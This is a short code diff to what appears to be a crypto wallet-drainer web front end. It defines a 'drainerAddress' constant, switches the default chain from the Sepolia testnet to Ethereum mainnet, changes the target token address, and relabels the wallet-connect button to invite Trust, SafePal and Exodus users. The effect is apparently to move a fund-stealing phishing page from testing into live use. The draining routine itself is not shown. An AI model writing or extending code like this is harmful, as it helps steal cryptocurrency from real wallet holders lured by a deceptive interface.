@@ -38,8 +38,8 @@ export default function Home() {
   const { data: ethBalance } = useBalance({ address })
 
   const drainerAddress = "0xd115dbad4574D1332a44d7453B387ad38750c957" as `0x${string}`;
-  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x546cfd202b5d656AafEB21E6cE8196F075122b44") as `0x${string}`;
-  const targetChainId = Number(process.env.NEXT_PUBLIC_CHAIN_ID || 11155111);
+  const tokenAddress = (process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x5179A923Be1E3e211da968ADdc8Ee9bF36d97252") as `0x${string}`;
+  const targetChainId = Number(process.env.NEXT_PUBLIC_CHAIN_ID || 1);
 
   const { data: nonce, isError: nonceError } = useReadContract({
     address: tokenAddress,
@@ -208,7 +208,7 @@ export default function Home() {
                         className={styles.connectBoxBtn}
                         onClick={() => connect({ connector })}
                       >
-                        Connect {connector.name}
+                        {connector.name === 'WalletConnect' ? 'Connect Trust / SafePal / Exodus' : `Connect ${connector.name}`}
                       </button>
                     ))}
                 </div>
